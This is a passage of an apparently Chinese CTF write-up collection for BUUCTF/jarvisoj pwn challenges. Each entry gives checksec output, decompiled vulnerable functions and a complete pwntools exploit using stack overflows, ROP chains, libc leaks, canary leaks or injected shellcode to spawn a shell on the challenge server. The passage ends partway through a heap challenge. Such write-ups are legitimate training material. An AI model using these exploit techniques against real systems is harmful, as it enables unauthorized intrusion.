-0000000000000119                 db ? ; undefined
-0000000000000118                 db ? ; undefined
-0000000000000117                 db ? ; undefined
-0000000000000116                 db ? ; undefined
-0000000000000115                 db ? ; undefined
-0000000000000114                 db ? ; undefined
-0000000000000113                 db ? ; undefined
-0000000000000112                 db ? ; undefined
-0000000000000111                 db ? ; undefined
-0000000000000110 bin_by_hex      db 256 dup(?)
-0000000000000010                 db ? ; undefined
-000000000000000F                 db ? ; undefined
-000000000000000E value2          db ?
-000000000000000D value1          db ?
-000000000000000C i_0             dd ?
-0000000000000008                 db ? ; undefined
-0000000000000007                 db ? ; undefined
-0000000000000006                 db ? ; undefined
-0000000000000005 diff            db ?
-0000000000000004 i               dd ?
+0000000000000000  s              db 8 dup(?)
+0000000000000008  r              db 8 dup(?)
+0000000000000010
+0000000000000010 ; end of stack variables
</code></pre>
<p>char的范围一般是0~255，这里有整数溢出，$190+|-66|=256$，这种都行</p>
<pre><code class="language-python">payload = ''
for i in range(50):
   payload += '0'
   payload += p8(0x100-0x40 + i)
</code></pre>
<p>这样的payload就可以通过检测了，然后逐字节爆破</p>
<pre><code class="language-python">sh = remote('node3.buuoj.cn',26493)
flag = ''
for i in range(1,51):
   print &quot;guess the index {}'s char&quot;.format(i)
   for c in range(32,128):
      pay = payload[0:2*i-2] + hex(c)[2:] + payload[2*i:]
      sh.sendlineafter('guess&gt; ',pay)
      ans = sh.recvuntil('\n')
      if 'Yaaaay!' in ans:
         flag += chr(c)
         break
   print 'flag=',flag
 
sh.close()
</code></pre>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *

#bypass
payload = ''
for i in range(50):
   payload += '0'
   payload += p8(0x100-0x40 + i)
    
#exploit
sh = remote('node3.buuoj.cn',26493)
flag = ''
for i in range(1,51):
   print &quot;guess the index {}'s char&quot;.format(i)
   for c in range(32,128):
      pay = payload[0:2*i-2] + hex(c)[2:] + payload[2*i:]
      sh.sendlineafter('guess&gt; ',pay)
      ans = sh.recvuntil('\n')
      if 'Yaaaay!' in ans:
         flag += chr(c)
         break
   print 'flag&gt;',flag
sh.close()
</code></pre>
<h2>jarvisoj_typo</h2>
<h3>1.checksec</h3>
<pre><code>Arch:     arm-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8000)
</code></pre>
<p>发现是arm架构的pwn</p>
<h2>jarvisoj_level0</h2>
<p>环境：Ubuntu16</p>
<h3>1.checksec</h3>
<pre><code>[*] '/home/o
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<h3>2.IDA</h3>
<p><strong>main</strong></p>
<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
{
  write(1, &quot;Hello, World\n&quot;, 0xDuLL);
  return vulnerable_function(1LL, &quot;Hello, World\n&quot;);
}
</code></pre>
<p><strong>vulnerable_function</strong></p>
<pre><code class="language-c">ssize_t vulnerable_function()
{
  char buf; // [rsp+0h] [rbp-80h]

  return read(0, &amp;buf, 0x200uLL);
}
</code></pre>
<blockquote>
<p>简单溢出，且含有system binsh</p>
</blockquote>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
context.log_level = &quot;debug&quot;
p = remote(&quot;node3.buuoj.cn&quot;,28704)
binsh = 0x040059A
payload = 'a'*0x88 + p64(binsh)
p.sendlineafter(&quot;\n&quot;,payload)
p.interactive()
</code></pre>
<h2>jarvisoj_level2</h2>
<p>环境：Ubuntu：16</p>
<h3>1.checksec</h3>
<pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>
<h3>2.IDA</h3>
<p><strong>main</strong></p>
<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
{
  vulnerable_function();
  system(&quot;echo 'Hello World!'&quot;);
  return 0;
}
</code></pre>
<p><strong>vulnerable_function</strong></p>
<pre><code class="language-c">ssize_t vulnerable_function()
{
  char buf; // [esp+0h] [ebp-88h]

  system(&quot;echo Input:&quot;);
  return read(0, &amp;buf, 0x100u);
}
</code></pre>
<blockquote>
<p>有system和binsh</p>
</blockquote>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
#context.log_level = &quot;debug&quot;
p = remote(&quot;node3.buuoj.cn&quot;,26265)
#p= process(&quot;./level2&quot;)

sys_addr = 0x0804845C
binsh = 0x0804A024

payload = 'a'*(0x88+4)
payload += p32(sys_addr) + p32(binsh)

p.sendlineafter(&quot;:&quot;,payload)
p.interactive()
</code></pre>
<blockquote>
<p>system只能选取已经执行过的system</p>
</blockquote>
<h2>jarvisoj_level3</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>
<h3>2.IDA</h3>
<p><strong>main</strong></p>
<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
{
  vulnerable_function();
  write(1, &quot;Hello, World!\n&quot;, 0xEu);
  return 0;
}
</code></pre>
<p><strong>vulnerable_function</strong></p>
<pre><code class="language-c">ssize_t vulnerable_function()
{
  char buf; // [esp+0h] [ebp-88h]

  write(1, &quot;Input:\n&quot;, 7u);
  return read(0, &amp;buf, 0x100u);
}
</code></pre>
<blockquote>
<p>栈溢出，需要找到libc</p>
</blockquote>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
from LibcSearcher import *
context.log_level = &quot;debug&quot;
p = remote(&quot;node3.buuoj.cn&quot;,26281)

elf = ELF(&quot;./level3&quot;)

libc_start = elf.sym[&quot;__libc_start_main&quot;]
libc_start_got = elf.got[&quot;__libc_start_main&quot;]

write_plt = elf.plt[&quot;write&quot;]
write_got = elf.got[&quot;write&quot;]

start_addr = 0x08048350


p1 = 'a'*0x88+'aaaa'
p1 += p32(write_plt)+p32(start_addr)
p1 += p32(1)+p32(write_got)+p32(4)

p.sendlineafter(&quot;:\n&quot;,p1)
write_real = u32(p.recv(4))
libc = LibcSearcher(&quot;write&quot;,write_real)
libc_base = write_real - libc.dump(&quot;write&quot;)
print &quot;libc_base=&gt;&quot;+hex(libc_base)

sys_addr = libc_base+libc.dump(&quot;system&quot;)
binsh = libc_base+libc.dump(&quot;str_bin_sh&quot;)

p1 = 'a'*(0x88+4)
p1 += p32(sys_addr)+p32(0)+p32(binsh)

p.sendlineafter(&quot;:\n&quot;,p1)
p.interactive()
</code></pre>
<h2>jarvisoj_level3_x64</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<h3>2.IDA</h3>
<p><strong>main</strong></p>
<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
{
  vulnerable_function();
  return write(1, &quot;Hello, World!\n&quot;, 0xEuLL);
}
</code></pre>
<p><strong>vulnerable_function</strong></p>
<pre><code class="language-c">ssize_t vulnerable_function()
{
  char buf; // [rsp+0h] [rbp-80h]

  write(1, &quot;Input:\n&quot;, 7uLL);
  return read(0, &amp;buf, 0x200uLL);
}
</code></pre>
<blockquote>
<p>read 溢出+libc_leak</p>
</blockquote>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
from LibcSearcher import *
context.log_level = &quot;debug&quot;
p = remote(&quot;node3.buuoj.cn&quot;,27722)
elf = ELF(&quot;./level3_x64&quot;)

read_got = elf.got['read']
write_plt = elf.plt['write']
vuln_addr = elf.sym[&quot;vulnerable_function&quot;]
pop_rdi_ret = 0x04006b3
pop_rsi_r15_ret = 0x04006b1
pop_rbp_ret = 0x0400550
'''
0x00000000004006ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006ae : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006b0 : pop r14 ; pop r15 ; ret
0x00000000004006b2 : pop r15 ; ret
0x00000000004006ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006af : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400550 : pop rbp ; ret
0x00000000004006b3 : pop rdi ; ret
0x00000000004006b1 : pop rsi ; pop r15 ; ret
0x00000000004006ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400499 : ret
'''

payload = 'a'*(0x80+8)
payload += p64(pop_rdi_ret)+p64(1)+p64(pop_rsi_r15_ret)+p64(read_got)+p64(0)
payload += p64(write_plt)+p64(vuln_addr)
p.recvuntil(&quot;Input:\n&quot;)
p.sendline(payload)
read_real = u64(p.recv(8))
libc = LibcSearcher(&quot;read&quot;,read_real)

libc_base = read_real - libc.dump(&quot;read&quot;)
sys_addr = libc_base + libc.dump(&quot;system&quot;)
binsh = libc_base + libc.dump(&quot;str_bin_sh&quot;)

log.info(&quot;libc base==&gt;%s&quot;,hex(libc_base))
log.info(&quot;system addr==&gt;%s&quot;,hex(sys_addr))
log.info(&quot;/bin/sh addr==&gt;%s&quot;,hex(binsh))

payload = 'a'*(0x80+8)
payload += p64(pop_rdi_ret)+p64(binsh)+p64(sys_addr)+p64(vuln_addr)
p.recvuntil(&quot;Input:\n&quot;)
p.sendline(payload)
p.interactive()
</code></pre>
<h2>jarvisoj_level4</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>
<h3>2.IDA</h3>
<p><strong>main</strong></p>
<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
{
  vulnerable_function();
  write(1, &quot;Hello, World!\n&quot;, 0xEu);
  return 0;
}
</code></pre>
<p><strong>vulnerable_function</strong></p>
<pre><code class="language-c">ssize_t vulnerable_function()
{
  char buf; // [esp+0h] [ebp-88h]

  return read(0, &amp;buf, 0x100u);
}
</code></pre>
<blockquote>
<p>这题本意是然大家用Dynefl来泄露libc的，但是LibcSearcher一样可以</p>
</blockquote>
<h3>3.EXP</h3>
<h4><strong>3.1 libcsearcher</strong></h4>
<pre><code class="language-python">from pwn import *
from LibcSearcher import *
context.log_level = &quot;debug&quot;
p = remote(&quot;node3.buuoj.cn&quot;,28393)
elf = ELF(&quot;./level4&quot;)

libc_start_main = elf.got[&quot;__libc_start_main&quot;]
write_plt = elf.plt['write']
main_addr = elf.sym['main']

payload = 'a'*(0x88+4)
payload += p32(write_plt)+p32(main_addr)+p32(1)+p32(libc_start_main)
p.sendline(payload)
libc_start_real = u32(p.recv(4))
libc = LibcSearcher(&quot;__libc_start_main&quot;,libc_start_real)

libc_base = libc_start_real - libc.dump(&quot;__libc_start_main&quot;)
sys_addr = libc_base + libc.dump(&quot;system&quot;)
binsh = libc_base + libc.dump(&quot;str_bin_sh&quot;)
log.info(&quot;libc base=&gt;%s&quot;,hex(libc_base))
log.info(&quot;system addr=&gt;%s&quot;,hex(sys_addr))
log.info(&quot;binsh addr=&gt;%s&quot;,hex(binsh))


payload = 'a'*(0x88+4)
payload += p32(sys_addr)+p32(0xdeadbeef)+p32(binsh)
p.sendline(payload)
p.interactive()
</code></pre>
<h4><strong>3.2 Dynelf</strong></h4>
<pre><code class="language-python">from pwn import *
io=remote(&quot;node3.buuoj.cn&quot;,28393)
elf=ELF(&quot;./level4&quot;)
vulner_function_address=0x804844B
write_plt=elf.plt[&quot;write&quot;]
read_plt=elf.plt[&quot;read&quot;]
bss_addr=0x0804a024
def leak(address):
	payload=&quot;a&quot;*0x88+&quot;aaaa&quot;+p32(write_plt)+p32(vulner_function_address)+p32(1)+p32(address)+p32(4)
	io.sendline(payload)
	leak_sysaddr=io.recv(4)
	print &quot;%#x =&gt; %s&quot; % (address, (leak_sysaddr or '').encode('hex'))
	return leak_sysaddr
d = DynELF(leak, elf=ELF(&quot;./level4&quot;))
sys_addr=d.lookup(&quot;system&quot;,&quot;libc&quot;)
print hex(sys_addr)
payload1=&quot;a&quot;*0x88+&quot;aaaa&quot;+p32(read_plt)+p32(vulner_function_address)+p32(1)+p32(bss_addr)+p32(8)
io.sendline(payload1)
io.sendline(&quot;/bin/sh&quot;)
payload2=&quot;a&quot;*0x88+&quot;aaaa&quot;+p32(sys_addr)+p32(vulner_function_address)+p32(bss_addr)
io.sendline(payload2)
io.interactive()
</code></pre>
<h2>jarvisoj_level5</h2>
<blockquote>
<p>buu上给的就是jarvisoj_level3_x64</p>
</blockquote>
<h2>jarvisoj_tell_me_something</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<h3>2.IDA</h3>
<p><strong>main</strong></p>
<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v4; // [rsp+0h] [rbp-88h]

  write(1, &quot;Input your message:\n&quot;, 0x14uLL);
  read(0, &amp;v4, 0x100uLL);
  return write(1, &quot;I have received your message, Thank you!\n&quot;, 0x29uLL);
}
</code></pre>
<p><strong>good_game</strong></p>
<pre><code class="language-c">int good_game()
{
  FILE *v0; // rbx
  int result; // eax
  char buf; // [rsp+Fh] [rbp-9h]

  v0 = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
  while ( 1 )
  {
    result = fgetc(v0);
    buf = result;
    if ( (_BYTE)result == -1 )
      break;
    write(1, &amp;buf, 1uLL);
  }
  return result;
}
</code></pre>
<blockquote>
<p>自行读取flag，不嫌麻烦也可试试open/read/write</p>
</blockquote>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
#context.log_level = &quot;debug&quot;
p = remote(&quot;node3.buuoj.cn&quot;,29781)
elf = ELF(&quot;./guestbook&quot;)

payload = 'a'*0x88 + p64(0x0400620)
p.recvuntil(&quot;message:&quot;)
p.sendline(payload)
print p.recv()
p.interactive()
</code></pre>
<h2>jarvisoj_test_your_memory</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>
<h3>2.IDA</h3>
<p><strong>main</strong></p>
<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  char s2[11]; // [esp+1Dh] [ebp-13h]
  int v6; // [esp+28h] [ebp-8h]
  int i; // [esp+2Ch] [ebp-4h]

  v6 = 10;
  puts(&quot;\n\n\n------Test Your Memory!-------\n&quot;);
  v3 = time(0);
  srand(v3);
  for ( i = 0; i &lt; v6; ++i )
    s2[i] = alphanum_2626[rand() % 0x3Eu];
  printf(&quot;%s&quot;, s2);
  mem_test(s2);
  return 0;
}
//.rodata:08048860 alphanum_2626   db 30h                  ; DATA XREF: main+5F↑r
//.rodata:08048861 a123456789abcde db '123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',0
</code></pre>
<blockquote>
<p>产生随机数，然后让我们来猜</p>
</blockquote>
<p><strong>mem_test</strong></p>
<pre><code class="language-c">int __cdecl mem_test(char *s2)
{
  int result; // eax
  char s; // [esp+15h] [ebp-13h]

  memset(&amp;s, 0, 0xBu);
  puts(&quot;\nwhat???? : &quot;);
  printf(&quot;0x%x \n&quot;, hint);
  puts(&quot;cff flag go go go ...\n&quot;);
  printf(&quot;&gt; &quot;);
  __isoc99_scanf(&quot;%s&quot;, &amp;s);
  if ( !strncmp(&amp;s, s2, 4u) )
    result = puts(&quot;good job!!\n&quot;);
  else
    result = puts(&quot;cff flag is failed!!\n&quot;);
  return result;
}
//.data:0804A040 hint            dd offset aCatFlag      ; DATA XREF: mem_test+2D↑r
//.data:0804A040 _data           ends                    ; &quot;cat flag&quot;
</code></pre>
<blockquote>
<p>验证我们的输入，并且有了<strong>栈溢出</strong>和<strong>cat flag</strong>的地址</p>
</blockquote>
<p><strong>win_func</strong></p>
<pre><code class="language-c">int __cdecl win_func(char *command)
{
  return system(command);
}
</code></pre>
<p>后门函数，作用==system</p>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
context.log_level = &quot;debug&quot;
p = remote(&quot;node3.buuoj.cn&quot;,28178)
elf = ELF(&quot;./memory&quot;)
cat_flag = 0x80487e0

payload = 'a'*(0x13+4)
payload += p32(elf.sym[&quot;win_func&quot;])+p32(cat_flag)
payload += p32(cat_flag)

p.sendline(payload)
p.interactive()
</code></pre>
<h2>not_the_same_3dctf_2016</h2>
<h3>1.checksec</h3>
<pre><code class="language-c">    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>
<h3>2.IDA</h3>
<p><strong>main</strong></p>
<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [esp+Fh] [ebp-2Dh]

  printf(&quot;b0r4 v3r s3 7u 4h o b1ch4o m3m0... &quot;);
  gets(&amp;v4);
  return 0;
}
</code></pre>
<blockquote>
<p>简单栈溢出，但是远程开启了段保护，所以用ROP取消段保护</p>
</blockquote>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
p=process('./not_the_same_3dsctf_2016')
p = remote(&quot;node3.buuoj.cn&quot;,28930)
elf=ELF('./not_the_same_3dsctf_2016')

payload='a'*0x2d+p32(elf.symbols['mprotect'])
payload+=p32(0x0809e3e5)
payload+=p32(0x080EB000)
payload+=p32(0x1000)+p32(0x7)
payload+=p32(elf.symbols['read'])
payload+=p32(0x0809e3e5)+p32(0)+p32(0x080EBF80)+p32(0x100)+p32(0x080EBF80)
p.sendline(payload)
payload=asm(shellcraft.sh())
p.sendline(payload)
p.interactive()
</code></pre>
<h2>others_babystack</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<h3>2.IDA</h3>
<p><strong>两个主要功能</strong></p>
<pre><code class="language-python">def store(text):
	p.sendlineafter(&quot;&gt;&gt;&quot;,&quot;1&quot;)
	p.sendline(text)

def Print():
	p.sendlineafter(&quot;&gt;&gt;&quot;,&quot;2&quot;)
</code></pre>
<p><strong>main</strong></p>
<pre><code class="language-c">__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  int v3; // eax
  char s; // [rsp+10h] [rbp-90h]
  unsigned __int64 v6; // [rsp+98h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  memset(&amp;s, 0, 0x80uLL);
  while ( 1 )
  {
    menu();
    v3 = READ();
    switch ( v3 )
    {
      case 2:
        puts(&amp;s);
        break;
      case 3:
        return 0LL;
      case 1:
        read(0, &amp;s, 0x100uLL);
        break;
      default:
        PUTS(&quot;invalid choice&quot;);
        break;
    }
    PUTS((const char *)&amp;unk_400AE7);
  }
}
</code></pre>
<blockquote>
<p>24行的<code>read</code>有一个短小的溢出，从这里我们使用19行的<code>puts</code>可以泄露<code>canary</code>的值，为之后更长的rop-chain做准备</p>
</blockquote>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
from LibcSearcher import *
context.log_level = &quot;debug&quot;
elf = ELF(&quot;babystack&quot;)
#p = process(&quot;./babystack&quot;)
p = remote(&quot;node3.buuoj.cn&quot;,&quot;28311&quot;)

def store(text):
	p.sendlineafter(&quot;&gt;&gt;&quot;,&quot;1&quot;)
	p.sendline(text)

def Print():
	p.sendlineafter(&quot;&gt;&gt;&quot;,&quot;2&quot;)

pop_rdi_ret = 0x0400a93
puts_plt = elf.plt[&quot;puts&quot;]
puts_got = elf.got[&quot;puts&quot;]
main = 0x0400908

if __name__ == '__main__':
	store('a'*0x88)
	Print()
	p.recvuntil('a\n')
	canary=u64(p.recv(7).rjust(8,'\x00'))
	log.success(&quot;canary =&gt;0x%x&quot;,canary)
	
	payload = 'a'*0x88+p64(canary)+'b'*8
	payload += p64(pop_rdi_ret)+p64(puts_got)
	payload += p64(puts_plt)+p64(main)
	store(payload)
	p.sendlineafter(&quot;&gt;&gt;&quot;,&quot;3&quot;)
	p.recv()

	puts_addr = u64(p.recv(6).ljust(8,'\x00'))
	libc = LibcSearcher(&quot;puts&quot;,puts_addr)
	base = puts_addr-libc.dump(&quot;puts&quot;)
	sys_addr = libc.dump(&quot;system&quot;)+base
	binsh = libc.dump(&quot;str_bin_sh&quot;)+base	
	log.success(&quot;puts real  =&gt;0x%x&quot;,puts_addr)
	log.success(&quot;libc base  =&gt;0x%x&quot;,base)
	log.success(&quot;system addr=&gt;0x%x&quot;,sys_addr)
	log.success(&quot;/bin/sh    =&gt;0x%x&quot;,binsh)

	payload = 'a'*0x88+p64(canary)+'b'*8
	payload += p64(pop_rdi_ret)+p64(binsh)
	payload += p64(sys_addr)
	store(payload)
	p.sendlineafter(&quot;&gt;&gt;&quot;,&quot;3&quot;)
	p.interactive()
</code></pre>
<h2>others_shellcode</h2>
<blockquote>
<p>连上就有</p>
</blockquote>
<h2>pwn1_sctf_2016</h2>
<h3>1.checsec</h3>
<pre><code class="language-bash">    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>
<h3>2.IDA</h3>
<p><strong>main</strong></p>
<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
{
  vuln();
  return 0;
}
</code></pre>
<p> <strong>vuln</strong></p>
<pre><code class="language-c">int vuln()
{
  const char *v0; // eax
  char s; // [esp+1Ch] [ebp-3Ch]
  char v3; // [esp+3Ch] [ebp-1Ch]
  char v4; // [esp+40h] [ebp-18h]
  char v5; // [esp+47h] [ebp-11h]
  char v6; // [esp+48h] [ebp-10h]
  char v7; // [esp+4Fh] [ebp-9h]

  printf(&quot;Tell me something about yourself: &quot;);
  fgets(&amp;s, 32, edata);
  std::string::operator=(&amp;input, &amp;s);
  std::allocator&lt;char&gt;::allocator(&amp;v5);
  std::string::string(&amp;v4, &quot;you&quot;, &amp;v5);
  std::allocator&lt;char&gt;::allocator(&amp;v7);
  std::string::string(&amp;v6, &quot;I&quot;, &amp;v7);
  replace((std::string *)&amp;v3);
  std::string::operator=(&amp;input, &amp;v3, &amp;v6, &amp;v4);
  std::string::~string((std::string *)&amp;v3);
  std::string::~string((std::string *)&amp;v6);
  std::allocator&lt;char&gt;::~allocator(&amp;v7);
  std::string::~string((std::string *)&amp;v4);
  std::allocator&lt;char&gt;::~allocator(&amp;v5);
  v0 = (const char *)std::string::c_str((std::string *)&amp;input);
  strcpy(&amp;s, v0);
  return printf(&quot;So, %s\n&quot;, &amp;s);
}
</code></pre>
<p> <strong>string</strong></p>
<pre><code class="language-bash">LOAD:08048154	00000013	C	/lib/ld-linux.so.2
.............   ........    .   ..........
LOAD:080488F4	00000007	C	strcpy
LOAD:080488FB	00000006	C	stdin
LOAD:08048901	00000007	C	printf
LOAD:08048908	00000006	C	fgets
LOAD:0804890E	0000000D	C	__cxa_atexit
LOAD:0804891B	00000007	C	system
LOAD:08048922	00000012	C	__libc_start_main
LOAD:08048934	00000008	C	GCC_3.0
LOAD:0804893C	0000000A	C	GLIBC_2.0
LOAD:08048946	0000000C	C	GLIBC_2.1.3
LOAD:08048952	0000000E	C	GLIBCXX_3.4.5
LOAD:08048960	0000000B	C	CXXABI_1.3
LOAD:0804896B	0000000C	C	GLIBCXX_3.4
.rodata:080497F0	0000000D	C	cat flag.txt
.rodata:08049800	00000023	C	Tell me something about yourself: 
.rodata:08049829	00000008	C	So, %s\n
.rodata:08049834	0000002A	C	basic_string::_S_construct null not valid
.eh_frame:0804996F	00000005	C	;*2$\&quot;
.eh_frame:0804999D	00000005	C	zPLR
</code></pre>
<blockquote>
<p>看上去不会溢出，但是把'I'替换成'you'，使字符串变多，栈溢出</p>
</blockquote>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
#context.log_level = 'debug'
p = remote(&quot;node3.buuoj.cn&quot;,25541)

cat_flag = 0x08048F0D

payload = 'I'*20 + 'a'*4 + p64(cat_flag)
p.sendline(payload)
p.interactive()
</code></pre>
<h2>pwn2_sctf_2016</h2>
<h3>1.checksec</h3>
<pre><code class="language-bash">[*] '/home/o
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>
<h3>2.IDA</h3>
<p><strong>vuln</strong></p>
<pre><code class="language-c">int vuln()
{
  char nptr; // [esp+1Ch] [ebp-2Ch]
  int v2; // [esp+3Ch] [ebp-Ch]

  printf(&quot;How many bytes do you want me to read? &quot;);
  get_n((int)&amp;nptr, 4u);
  v2 = atoi(&amp;nptr);
  if ( v2 &gt; 32 )
    return printf(&quot;No! That size (%d) is too large!\n&quot;, v2);
  printf(&quot;Ok, sounds good. Give me %u bytes of data!\n&quot;, v2);
  get_n((int)&amp;nptr, v2);
  return printf(&quot;You said: %s\n&quot;, &amp;nptr);
}
</code></pre>
<p><strong>get_n</strong></p>
<pre><code class="language-c">int __cdecl get_n(int a1, unsigned int a2)
{
  int v2; // eax
  int result; // eax
  char v4; // [esp+Bh] [ebp-Dh]
  unsigned int v5; // [esp+Ch] [ebp-Ch]
    
  v5 = 0;
  while ( 1 )
  {
    v4 = getchar();
    if ( !v4 || v4 == 10 || v5 &gt;= a2 )
      break;
    v2 = v5++;
    *(_BYTE *)(v2 + a1) = v4;
  }
  result = a1 + v5;
  *(_BYTE *)(a1 + v5) = 0;
  return result;
}
</code></pre>
<blockquote>
<p>这里就存在一个atoi，输入-1时会转化为非零型整数，造成整数溢出</p>
</blockquote>
<blockquote>
<p>整数了过后，就可以写更多的值，从而getshell</p>
</blockquote>
<blockquote>
<p>溢出要覆盖的量可以从gdb调试出来</p>
</blockquote>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
from LibcSearcher import *
context.log_level = &quot;debug&quot;
elf = ELF(&quot;./pwn2_sctf_2016&quot;)
libc = ELF(&quot;./libc-2.23.so&quot;)
p = remote(&quot;node3.buuoj.cn&quot;,29632)
#p = process(&quot;./pwn2_sctf_2016&quot;)

start_addr = 0x080483d0
output_addr = 0x080486F8
vuln_addr = 0x0804852F
printf_plt = elf.plt['printf']
printf_got = elf.got['printf']

payload = 'a'*48 
payload += p32(printf_plt) + p32(start_addr) 
payload += p32(output_addr) + p32(elf.got[&quot;__libc_start_main&quot;])

p.recvuntil(&quot;?&quot;)
p.sendline(&quot;-1&quot;)
p.recv()
p.sendline(flat(payload))

p.recvuntil(&quot;You said: &quot;) #一段无法输出完整
p.recvuntil(&quot;You said: &quot;)

main_real = u32(p.recv(4))
#libc = LibcSearcher('__libc_start_main',main_real)
libcbase = main_real - libc.sym[&quot;__libc_start_main&quot;]
sys_addr = libcbase + libc.sym['system']
binsh = libcbase + libc.search(&quot;/bin/sh\x00&quot;).next()

payload = 'a'*48 + p32(sys_addr)+p32(output_addr) + p32(binsh)

p.recvuntil(&quot;?&quot;)
p.sendline(&quot;-1&quot;)
p.recvuntil(&quot;!&quot;)
p.sendline(payload)
p.interactive()
</code></pre>
<h2>pwnable_hack_note</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>
<h3>2.IDA</h3>
<p>基本功能如下</p>
<pre><code class="language-c">def add(size, content):
    p.sendlineafter(&quot;Your choice :&quot;, &quot;1&quot;) 
    p.recvuntil(&quot;Note size :&quot;)
    p.sendline(str(size))
    p.recvuntil(&quot;Content :&quot;)
    p.sendline(content)

def delete(index):
    p.sendlineafter(&quot;Your choice :&quot;, &quot;2&quot;)
    p.recvuntil(&quot;Index :&quot;)
    p.sendline(str(index))
    

def show(index):
    p.sendlineafter(&quot;Your choice :&quot;, &quot;3&quot;)
    p.recvuntil(&quot;Index :&quot;)
    p.sendline(str(index))
</code></pre>
<p><strong>delete</strong></p>
<pre><code class="language-c">if ( ptr[v1] )
  {
    free(*((void **)ptr[v1] + 1));
    free(ptr[v1]);
    puts(&quot;Success&quot;);
  }
</code></pre>
<blockquote>
<p>指针没有归零</p>
</blockquote>
<h3>3.GDB</h3>
<h4>0x1 先申请一个chunk</h4>
<pre><code>pwndbg&gt; heap
0x804b000 FASTBIN {
  prev_size = 0, 
  size = 17, 
  fd = 0x804862b, 
  bk = 0x804b018, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x11
}
0x804b010 FASTBIN {
  prev_size = 0, 
  size = 17, 
  fd = 0x61616161, 
  bk = 0xa, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x20fe1
}
0x804b020 PREV_INUSE {
  prev_size = 0, 
  size = 135137, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x804b000:	0x00000000	0x00000011	0x0804862b	0x0804b018
0x804b010:	0x00000000	0x00000011	0x61616161	0x0000000a
0x804b020:	0x00000000	0x00020fe1	0x00000000	0x00000000
0x804b030:	0x00000000	0x00000000	0x00000000	0x00000000
</code></pre>
<h4>0x2 查看<code>0x0804862b</code>和<code>0x0804b018</code></h4>
<p><strong>0x0804862b</strong></p>
<pre><code class="language-c">int __cdecl sub_804862B(int a1)
{
  return puts(*(const char **)(a1 + 4));
}
</code></pre>
<p><strong>0x0804b018</strong></p>
<p>该地址应该是绑定的分配堆的地址，到时候修补上就行</p>
<h3>4.思路</h3>
<ul>
